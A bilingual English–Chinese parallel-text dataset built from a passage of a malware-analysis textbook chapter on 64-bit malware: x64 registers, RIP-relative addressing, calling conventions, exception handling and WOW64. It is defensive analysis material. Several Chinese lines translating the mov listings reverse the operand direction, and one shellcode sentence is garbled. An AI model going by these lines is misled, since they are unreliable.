- en: For example, the RAX register is the 64-bit version of the EAX register.
  id: totrans-0
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，RAX 寄存器是 EAX 寄存器的 64 位版本。
- en: 
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Some of the general-purpose registers (RDI, RSI, RBP, and RSP) have been extended
    to support byte accesses, by adding an *L* suffix to the 16-bit version. For example,
    BP normally accesses the lower 16 bits of RBP; now, BPL accesses the lowest 8
    bits of RBP.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 一些通用寄存器（RDI、RSI、RBP 和 RSP）通过在 16 位版本中添加 *L* 后缀来扩展以支持字节访问。例如，BP 通常访问 RBP 的低 16
    位；现在，BPL 访问 RBP 的最低 8 位。
- en: 
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: The special-purpose registers are 64-bits and have been renamed. For example,
    RIP is the 64-bit instruction pointer.
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 特殊用途寄存器是 64 位并已重命名。例如，RIP 是 64 位的指令指针。
- en: 
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: There are twice as many general-purpose registers. The new registers are labeled
    R8 though R15\. The DWORD (32-bit) versions of these registers can be accessed
    as R8D, R9D, and so on. WORD (16-bit) versions are accessed with a *W* suffix
    (R8W, R9W, and so on), and byte versions are accessed with an *L* suffix (R8L,
    R9L, and so on).
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 通用寄存器的数量翻倍。新的寄存器被标记为 R8 到 R15。这些寄存器的 DWORD（32位）版本可以通过 R8D、R9D 等方式访问。WORD（16位）版本通过
    *W* 后缀访问（R8W、R9W 等），而字节版本通过 *L* 后缀访问（R8L、R9L 等）。
- en: x64 also supports instruction pointer–relative data addressing. This is an important
    difference between x64 and x86 in relation to PIC and shellcode. Specifically,
    in x86 assembly, anytime you want to access data at a location that is not an
    offset from a register, the instruction must store the entire address. This is
    called *absolute addressing*. But in x64 assembly, you can access data at a location
    that is an offset from the current instruction pointer. The x64 literature refers
    to this as *RIP-relative addressing*. Listing 21-1
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: x64 还支持指令指针相对数据寻址。这是 x64 与 x86 在 PIC 和 shellcode 方面的一个重要区别。具体来说，在 x86 汇编中，每次你想访问非寄存器偏移量的数据位置时，指令必须存储整个地址。这被称为
    *绝对寻址*。但在 x64 汇编中，你可以访问当前指令指针偏移量的数据位置。x64 文献将这称为 *RIP 相对寻址*。列表 21-1
- en: shows a simple C program that accesses a memory address.
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 展示了一个简单的 C 程序，该程序访问一个内存地址。
- en: int x;
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: int x;
- en: void foo() {
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: void foo() {
- en: int y = x;
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: int y = x;
- en: '...'
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: '}'
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: '}'
- en: '*Listing 21-1: A simple C program with a data access*'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 21-1：具有数据访问的简单 C 程序*'
- en: The x86 assembly code for Listing 21-1 references global data (the variable
    x). In order to access this data, the instruction encodes the 4 bytes representing
    the data’s address. This instruction is not position independent, because it will
    always access address 0x00403374, but if this file were to be loaded at a different
    location, the instruction would need to be modified so that the mov instruction
    accessed the correct address, as shown in Listing 21-2\.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 21-1 的 x86 汇编代码引用了全局数据（变量 x）。为了访问此数据，指令编码了表示数据地址的 4 个字节。这个指令不是位置无关的，因为它将始终访问地址
    0x00403374，但如果这个文件被加载到不同的位置，该指令需要修改，以便 mov 指令访问正确的地址，如列表 21-2 所示。
- en: 00401004 A1 74 33 40 00 mov eax, dword_403374
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 00401004 A1 74 33 40 00 mov eax, dword_403374
- en: '*Listing 21-2: x86 assembly for the C program in Listing 21-1*'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 21-2：列表 21-1 中的 C 程序的 x86 汇编*'
- en: 64-Bit Malware
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 64 位恶意软件
- en: '**443**'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: '**443**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: You’ll notice that the bytes of the address are stored with the instruction
    at
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 你会注意到地址的字节与指令一起存储在
- en: , , , and . Remember that the bytes are stored with the least significant
    byte first. The bytes 74, 33, 40, and 00 correspond to the address 0x00403374\.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: , , , 和 。记住字节是按最低有效字节优先存储的。字节 74、33、40 和 00 对应地址 0x00403374。
- en: After recompiling for x64, Listing 21-3 shows the same mov instruction that
    appears in Listing 21-2\.
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 在重新编译为 x64 后，列表 21-3 显示了与列表 21-2 中出现的相同 mov 指令。
- en: 0000000140001058 8B 05 A2 D3 00 00 mov eax, dword_14000E400
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 0000000140001058 8B 05 A2 D3 00 00 mov eax, dword_14000E400
- en: '*Listing 21-3: x64 assembly for Listing 21-1*'
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 21-3：列表 21-1 的 x64 汇编*'
- en: At the assembly level, there doesn’t appear to be any change. The instruction
    is still mov eax, dword *_address*, and IDA Pro automatically calculates the instruction’s
    address. However, the differences at the opcode level allow this code to be position-independent
    on x64, but not x86\.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 在汇编级别，似乎没有变化。指令仍然是 mov eax, dword *_address*，IDA Pro 自动计算指令的地址。然而，在操作码级别的差异使得这段代码在
    x64 上位置无关，但在 x86 上不是。
- en: In the 64-bit version of the code, the instruction bytes do not contain the
    fixed address of the data. The address of the data is 14000E400, but the instruction
    bytes are A2 , D3 , 00 , and 00 , which correspond to the value 0x0000D3A2\.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 在代码的64位版本中，指令字节不包含数据的固定地址。数据的地址是14000E400，但指令字节是A2 , D3 , 00 , 和 00 ，它们对应于值0x0000D3A2\.
- en: The 64-bit instruction stores the address of the data as an offset from the
    current instruction pointer, rather than as an absolute address, as stored in
    the 32-bit version. If this file were loaded at a different location, the instruction
    would still point to the correct address, unlike in the 32-bit version. In that
    case, if the file is loaded at a different address, the reference must be changed.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 64位指令将数据的地址存储为当前指令指针的偏移量，而不是像32位版本中那样存储为绝对地址。如果这个文件在不同的位置加载，指令仍然会指向正确的地址，这与32位版本不同。在这种情况下，如果文件在不同的地址加载，引用必须更改。
- en: Instruction pointer–relative addressing is a powerful addition to the x64
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 指令指针相对寻址是x64架构的一个强大补充
- en: instruction set that significantly decreases the number of addresses that must
    be relocated when a DLL is loaded. Instruction pointer–relative addressing also
    makes it much easier to write shellcode because it eliminates the need to obtain
    a pointer to EIP in order to access data. Unfortunately, this addition also makes
    it more difficult to detect shellcode, because it eliminates the need for a call/pop
    as discussed in “Position-Independent Code” on page 408\.
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 指令集可以显著减少在加载DLL时必须重定位的地址数量。指令指针相对寻址还使得编写shellcode变得更容易，因为它消除了为了访问数据而获取EIP指针的需要。不幸的是，这个补充也使得检测shellcode变得更加困难，因为它消除了在“位置无关代码”中讨论的call/pop的需要。
- en: Many of those common shellcode techniques are unnecessary or irrelevant when
    working with malware written to run on the x64 architecture.
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 当与为在x64架构上运行的恶意软件编写的软件一起工作时，许多常见的shellcode技术都是不必要的或不相关的。
- en: '***Differences in the x64 Calling Convention and Stack Usage***'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: '***x64调用约定和堆栈使用差异***'
- en: The calling convention used by 64-bit Windows is closest to the 32-bit fastcall
    calling convention discussed in Chapter 6\. The first four parameters of the call
    are passed in the RCX, RDX, R8, and R9 registers; additional ones are stored on
    the stack.
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 64位Windows使用的调用约定与第6章中讨论的32位fastcall调用约定最接近。调用的前四个参数通过RCX、RDX、R8和R9寄存器传递；额外的参数存储在堆栈上。
- en: '**NOTE**'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*Most of the conventions and hints described in this section apply to compiler-generated*
    *code that runs on the Windows OS. There is no processor-enforced requirement
    to follow* *these conventions, but Microsoft’s guidelines for compilers specify
    certain rules in order* *to ensure consistency and stability. Beware, because
    hand-coded assembly and malicious code may disregard these rules and do the unexpected.
    As usual, investigate any* *code that doesn’t follow the rules.*'
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: '*本节中描述的大多数约定和提示适用于在Windows OS上运行的编译器生成的* *代码。没有处理器强制要求遵循* *这些约定，但微软的编译器指南指定了某些规则以确保一致性和稳定性。请注意，因为手工编写的汇编代码和恶意代码可能会忽略这些规则并执行预期之外的操作。像往常一样，调查任何*
    *不遵循这些规则的代码。*'
- en: In the case of 32-bit code, stack space can be allocated and unallocated in
    the middle of the function using push and pop instructions. However, in 64-bit
    code, functions cannot allocate any space in the middle of the function, regardless
    of whether they’re push or other stack-manipulation instructions.
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 在32位代码的情况下，可以在函数中间使用push和pop指令分配和释放堆栈空间。然而，在64位代码中，函数不能在函数中间分配任何空间，无论它们是push还是其他堆栈操作指令。
- en: '**444**'
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: '**444**'
- en: Chapter 21
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 第21章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Figure 21-1 compares the stack management of 32-bit and 64-bit code.
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 图21-1比较了32位和64位代码的堆栈管理。
- en: Notice in the graph for a 32-bit function that the stack size grows as arguments
    are pushed on the stack, and then falls when the stack is cleaned up.
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 注意在32位函数的图中，堆栈大小随着参数被推入堆栈而增长，然后在清理堆栈时减小。
- en: Stack space is allocated at the beginning of the function, and moves up and
    down during the function call. When calling a function, the stack size grows;
    when the function returns, the stack size returns to normal. In contrast, the
    graph for a 64-bit function shows that the stack grows at the start of the function
    and remains at that level until the end of the function.
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 栈空间在函数开始时分配，并在函数调用期间上下移动。在调用函数时，栈大小增加；当函数返回时，栈大小恢复正常。相比之下，64 位函数的图显示栈在函数开始时增长，并保持在该水平直到函数结束。
- en: 32-bit Function
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 32 位函数
- en: 64-bit Function
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 64 位函数
- en: Stack Size
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 栈大小
- en: Stack Size
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 栈大小
- en: Time
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 时间
- en: Time
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 时间
- en: '*Figure 21-1: Stack size in the same function compiled for 32-bit and 64-bit
    architectures* The 32-bit compiler will sometimes generate code that doesn’t change
    the stack size in the middle of the function, but 64-bit code never changes the
    stack size in the middle of the function. Although this stack restriction is not
    enforced by the processor, the Microsoft 64-bit exception-handling model depends
    on it in order to function properly. Functions that do not follow this convention
    may crash or cause other problems if an exception occurs.'
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 21-1：为 32 位和 64 位架构编译的同一函数中的栈大小* 32 位编译器有时会在函数中间生成不改变栈大小的代码，但 64 位代码永远不会在函数中间改变栈大小。尽管处理器不强制执行这种栈限制，但微软的
    64 位异常处理模型依赖于它才能正常工作。不遵循此约定的函数如果在发生异常时可能会崩溃或引起其他问题。'
- en: The lack of push and pop instructions in the middle of a function can make it
    more difficult for an analyst to determine how many parameters a function has,
    because there is no easy way to tell whether a memory address is being used as
    a stack variable or as a parameter to a function. There’s also no way to tell
    whether a register is being used as a parameter. For example, if ECX is loaded
    with a value immediately before a function call, you can’t tell if the register
    is loaded as a parameter or for some other reason.
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 函数中间缺少 push 和 pop 指令可能会使分析员更难确定函数有多少个参数，因为没有简单的方法来判断一个内存地址是作为栈变量使用还是作为函数的参数。也无法判断寄存器是否被用作参数。例如，如果
    ECX 在函数调用之前立即加载了一个值，你无法判断该寄存器是作为参数加载还是出于其他原因。
- en: Listing 21-4 shows an example of the disassembly for a function call compiled
    for a 32-bit processor.
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 21-4 展示了为 32 位处理器编译的函数调用反汇编的示例。
- en: 004113C0 mov eax, [ebp+arg_0]
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 004113C0 将 eax 寄存器的值移动到 [ebp+arg_0]
- en: 004113C3 push eax
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 004113C3 将 eax 寄存器的值压入栈中
- en: 004113C4 mov ecx, [ebp+arg_C]
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 004113C4 将 ecx 寄存器的值移动到 [ebp+arg_C]
- en: 004113C7 push ecx
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 004113C7 将 ecx 寄存器的值压入栈中
- en: 004113C8 mov edx, [ebp+arg_8]
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 004113C8 将 edx 寄存器的值移动到 [ebp+arg_8]
- en: 004113CB push edx
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 004113CB 将 edx 寄存器的值压入栈中
- en: 004113CC mov eax, [ebp+arg_4]
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 004113CC 将 eax 寄存器的值移动到 [ebp+arg_4]
- en: 004113CF push eax
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 004113CF 将 eax 寄存器的值压入栈中
- en: 004113D0 push offset aDDDD_
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 004113D0 将 aDDDD_ 的偏移量压入栈中
- en: 004113D5 call printf
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 004113D5 调用 printf 函数
- en: 004113DB add esp, 14h
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 004113DB 将 esp 寄存器的值增加 14h
- en: '*Listing 21-4: Call to printf compiled for a 32-bit processor* 64-Bit Malware'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 21-4：为 32 位处理器编译的 printf 调用*'
- en: '**445**'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: '**445**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The 32-bit assembly has five push instructions before the call to printf, and
    immediately after the call to printf, 0x14 is added to the stack to clean it up.
    This clearly indicates that there are five parameters being passed to the printf
    function.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 32 位汇编在调用 printf 之前有五个 push 指令，并在调用 printf 后立即将 0x14 添加到栈中以便清理。这清楚地表明有五个参数被传递给
    printf 函数。
- en: 'Listing 21-5 shows the disassembly for the same function call compiled for
    a 64-bit processor:'
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 21-5 展示了为 64 位处理器编译的相同函数调用的反汇编代码：
- en: 0000000140002C96 mov ecx, [rsp+38h+arg_0]
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 0000000140002C96 将 ecx 寄存器的值移动到 [rsp+38h+arg_0]
- en: 0000000140002C9A mov eax, [rsp+38h+arg_0]
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 0000000140002C9A 将 eax 寄存器的值移动到 [rsp+38h+arg_0]
- en: 0000000140002C9Emov [rsp+38h+var_18], eax
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 0000000140002C9E 将 eax 寄存器的值移动到 [rsp+38h+var_18]
- en: 0000000140002CA2 mov r9d, [rsp+38h+arg_18]
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 0000000140002CA2 将 r9d 寄存器的值移动到 [rsp+38h+arg_18]
- en: 0000000140002CA7 mov r8d, [rsp+38h+arg_10]
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 0000000140002CA7 将 r8d 寄存器的值移动到 [rsp+38h+arg_10]
- en: 0000000140002CAC mov edx, [rsp+38h+arg_8]
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 0000000140002CAC 将 edx 寄存器的值移动到 [rsp+38h+arg_8]
- en: 0000000140002CB0 lea rcx, aDDDD_
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 0000000140002CB0 将 aDDDD_ 的地址加载到 rcx 寄存器中
- en: 0000000140002CB7 call cs:printf
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 0000000140002CB7 调用 cs:printf
- en: '*Listing 21-5: Call to printf compiled for a 64-bit processor* In 64-bit disassembly,
    the number of parameters passed to printf is less evident. The pattern of load
    instructions in RCX, RDX, R8, and R9 appears to show parameters being moved into
    the registers for the printf function call, but the mov instruction at  is not
    as clear. IDA Pro labels this as a move into a local variable, but there is no
    clear way to distinguish between a move into a local variable and a parameter
    for the function being called.'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表21-5：为64位处理器编译的printf调用* 在64位反汇编中，传递给printf的参数数量不太明显。RCX、RDX、R8和R9中的加载指令模式似乎表明参数被移动到寄存器中，以便进行printf函数调用，但处的mov指令并不那么清晰。IDA
    Pro将其标记为移动到局部变量，但没有明显的方法可以区分移动到局部变量和被调用函数的参数。'
- en: In this case, we can just check the format string to see how many parameters
    are being passed, but in other cases, it will not be so easy.
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，我们只需检查格式字符串就可以看到传递了多少参数，但在其他情况下，可能不会这么简单。
- en: '**Leaf and Nonleaf Functions**'
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: '**叶函数和非叶函数**'
- en: 'The 64-bit stack usage convention breaks functions into two categories: leaf
    and nonleaf functions. Any function that calls another function is called a *nonleaf
    function*, and all other functions are *leaf functions*.'
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 64位栈使用约定将函数分为两类：叶函数和非叶函数。任何调用其他函数的函数被称为*非叶函数*，而所有其他函数都是*叶函数*。
- en: Nonleaf functions are sometimes called *frame functions* because they require
    a stack frame. All nonleaf functions are required to allocate 0x20
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 非叶函数有时被称为*框架函数*，因为它们需要一个栈帧。所有非叶函数都必须分配0x20
- en: bytes of stack space when they call a function. This allows the function being
    called to save the register parameters (RCX, RDX, R8, and R9) in that space, if
    necessary.
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 当它们调用函数时，会占用栈空间。这允许被调用的函数在必要时将寄存器参数（RCX、RDX、R8和R9）保存在该空间中。
- en: In both leaf and nonleaf functions, the stack will be modified only at the beginning
    or end of the function. These portions that can modify the stack frame are discussed
    next.
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 在叶函数和非叶函数中，栈的修改仅发生在函数的开始或结束。接下来将讨论可以修改栈帧的这些部分。
- en: '**Prologue and Epilogue 64-Bit Code**'
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: '**序言和尾声64位代码**'
- en: Windows 64-bit assembly code has well-formed sections at the beginning and end
    of functions called the *prologue* and *epilogue*, which can provide useful information.
    Any mov instructions at the beginning of a prologue are always used to store the
    parameters that were passed into the function. (The compiler cannot insert mov
    instructions that do anything else within the prologue.) Listing 21-6 shows an
    example of a prologue for a small function.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: Windows 64位汇编代码在函数的开始和结束处有良好结构的部分，称为*序言*和*尾声*，它们可以提供有用的信息。序言开始处的任何mov指令总是用来存储传递给函数的参数。（编译器不能在序言中插入执行其他操作的mov指令。）列表21-6显示了小型函数的序言示例。
- en: '**446**'
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: '**446**'
- en: Chapter 21
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 第21章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 00000001400010A0 mov [rsp+arg_8], rdx 00000001400010A5 mov [rsp+arg_0], ecx
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 00000001400010A0 mov [rsp+arg_8], rdx 00000001400010A5 mov [rsp+arg_0], ecx
- en: 00000001400010A9 push rdi
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 00000001400010A9 push rdi
- en: 00000001400010AA sub rsp, 20h
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 00000001400010AA sub rsp, 20h
- en: '*Listing 21-6: Prologue code for a small function*'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表21-6：小型函数的序言代码*'
- en: 'Here, we see that this function has two parameters: one 32-bit and one 64-bit.
    This function allocates 0x20 bytes from the stack, as required by all nonleaf
    functions as a place to provide storage for parameters. If a function has any
    local stack variables, it will allocate space for them in addition to the 0x20
    bytes. In this case, we can tell that there are no local stack variables because
    only 0x20 bytes are allocated.'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，我们可以看到这个函数有两个参数：一个32位和一个64位。这个函数从栈中分配了0x20字节，这是所有非叶函数所需的，作为提供参数存储空间的地方。如果一个函数有任何局部栈变量，它将分配额外的空间来存储这些变量，除了0x20字节。在这种情况下，我们可以判断没有局部栈变量，因为只分配了0x20字节。
- en: '***64-Bit Exception Handling***'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: '***64位异常处理***'
- en: Unlike exception handling in 32-bit systems, structured exception handling in
    x64 does not use the stack. In 32-bit code, the fs:[0] is used as a pointer to
    the current exception handler frame, which is stored on the stack so that each
    function can define its own exception handler. As a result, you will often find
    instructions modifying fs:[0] at the beginning of a function. You will also find
    exploit code that overwrites the exception information on the stack in order to
    get control of the code executed during an exception.
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 与 32 位系统中的异常处理不同，x64 中的结构化异常处理不使用堆栈。在 32 位代码中，fs:[0] 被用作当前异常处理帧的指针，该帧存储在堆栈上，以便每个函数都可以定义自己的异常处理程序。因此，你经常会发现在函数开始处修改
    fs:[0] 的指令。你也会找到覆盖堆栈上异常信息的利用代码，以便在异常期间控制代码执行。
- en: Structured exception handling in x64 uses a static exception information table
    stored in the PE file and does not store any data on the stack.
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: x64 中的结构化异常处理使用存储在 PE 文件中的静态异常信息表，并且不在堆栈上存储任何数据。
- en: Also, there is an _IMAGE_RUNTIME_FUNCTION_ENTRY structure in the .pdata section
    for every function in the executable that stores the beginning and ending address
    of the function, as well as a pointer to exception-handling information for that
    function.
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 此外，在可执行文件的每个函数的 .pdata 部分都有一个 _IMAGE_RUNTIME_FUNCTION_ENTRY 结构，用于存储函数的开始和结束地址，以及该函数的异常处理信息指针。
- en: '**Windows 32-Bit on Windows 64-Bit**'
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: '**Windows 32-Bit on Windows 64-Bit**'
- en: Microsoft developed a subsystem called Windows 32-bit on Windows 64-bit (WOW64)
    in order to allow 32-bit applications to execute properly on a 64-bit machine.
    This subsystem has several features that can be used by malicious code.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 微软开发了一个名为 Windows 32-bit on Windows 64-bit (WOW64) 的子系统，以便允许 32 位应用程序在 64 位机器上正确执行。该子系统具有一些恶意代码可以使用的功能。
- en: WOW64 uses the 32-bit mode of x64 processors in order to execute instructions,
    but work-arounds are needed for the registry and filesystem.
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: WOW64 使用 x64 处理器的 32 位模式来执行指令，但需要针对注册表和文件系统进行工作绕过。
- en: The Microsoft DLLs that form the core of the Win32 environment are in the *SYSTEMROOT*
    directory, usually in *\Windows\System32*. Many applications access this directory
    to search for Microsoft DLLs or to install their own DLLs. Therefore, there must
    be separate DLLs for both 32- and 64-bit processes to avoid conflicts.
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 构成 Win32 环境核心的 Microsoft DLL 位于 *SYSTEMROOT* 目录中，通常在 *\Windows\System32*。许多应用程序访问此目录以搜索
    Microsoft DLL 或安装它们自己的 DLL。因此，必须为 32 位和 64 位进程提供单独的 DLL 以避免冲突。
- en: For compatibility reasons, the 64-bit binaries are stored in the *\System32*
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 由于兼容性原因，64 位二进制文件存储在 *\System32*
- en: directory. For 32-bit applications, this directory is redirected to the *\WOW64*
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 目录中。对于 32 位应用程序，此目录被重定向到 *\WOW64*
- en: directory; a counterintuitive choice because the 64-bit binaries are in the
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 目录；这是一个反直觉的选择，因为 64 位二进制文件位于
- en: '*\System**32*** directory and the 32-bit binaries are in the *\WOW**64*** directory.'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: '*\System**32*** 目录和 32 位二进制文件位于 *\WOW**64*** 目录中。'
- en: 64-Bit Malware
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: 64 位恶意软件
- en: '**447**'
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: '**447**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: In analyzing 32-bit malware on a 64-bit system, if you find that it writes a
    file to *C:\Windows\System32*, you will need to go to *C:\Windows\WOW64* to find
    that file.
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 在分析 64 位系统上的 32 位恶意软件时，如果你发现它将文件写入 *C:\Windows\System32*，你需要转到 *C:\Windows\WOW64*
    来找到该文件。
- en: Another redirection exists for 32-bit applications that access the HKEY_
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 对于访问 HKEY_ 的 32 位应用程序，还存在另一个重定向。
- en: LOCAL_MACHINE\Software registry key, which is mapped to HKEY_LOCAL_MACHINE\
    Software\Wow6432Node. Any 32-bit applications accessing the software registry
    key will be redirected.
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: LOCAL_MACHINE\Software 注册表键，它映射到 HKEY_LOCAL_MACHINE\ Software\Wow6432Node。任何访问软件注册表键的
    32 位应用程序都将被重定向。
- en: 32-bit applications are normally unaware that they are running on WOW64, but
    a few mechanisms allow the applications to see outside the WOW64 environment.
    The first is the IsWow64Process function, which can be used by 32-bit applications
    to determine if they are running in a WOW64
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 32 位应用程序通常不知道它们正在 WOW64 上运行，但有一些机制允许应用程序看到 WOW64 环境之外的内容。第一个是 IsWow64Process
    函数，32 位应用程序可以使用它来确定它们是否在 WOW64
- en: process. Applications can access the real *\System32* directory by accessing
    *C:\Windows\Sysnative*, even when the *\System32* is being redirected to WOW64\.
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 进程。即使 *\System32* 正在被重定向到 WOW64\，应用程序也可以通过访问 *C:\Windows\Sysnative* 来访问实际的 *\System32*
    目录。
- en: The Wow64DisableWow64FsRedirection function disables filesystem redirection
    entirely for a given thread. Registry functions such as RegCreateKeyEx, RegDeleteKeyEx,
    and RegOpenKeyEx have a new flag that can be used to specify that an application
    wants to access the 32-bit or 64-bit view of the registry, regardless of the type
    of application. This flag can be used when 32-bit malware is making changes meant
    to affect 64-bit applications.
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: Wow64DisableWow64FsRedirection函数完全禁用给定线程的文件系统重定向。像RegCreateKeyEx、RegDeleteKeyEx和RegOpenKeyEx这样的注册表函数有一个新标志，可以用来指定应用程序想要访问32位或64位注册表视图，而不管应用程序的类型如何。当32位恶意软件进行旨在影响64位应用程序的更改时，可以使用此标志。
- en: '**64-Bit Hints at Malware Functionality**'
  id: totrans-114
  prefs: []
